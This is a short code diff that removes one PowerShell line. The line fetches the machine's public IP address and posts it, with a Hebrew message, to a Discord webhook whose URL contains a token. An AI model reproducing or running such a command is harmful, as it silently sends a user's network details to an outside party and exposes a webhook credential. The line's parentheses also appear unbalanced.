@@ -1,1 +1,0 @@
-Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1189885690482266152/AI653-BtpYcKjISk6puUq0qlD5WOMZFBI-CbZv5n_uiKGjXAb5TZceNGtVvHylAAv1yu" -Method Post -Body (@{content = "ה-IP החיצוני שלי הוא: $(Invoke-RestMethod -Uri 'https://api.ipify.org?format=json').ip"}) | ConvertTo-Json) -ContentType "application/json"
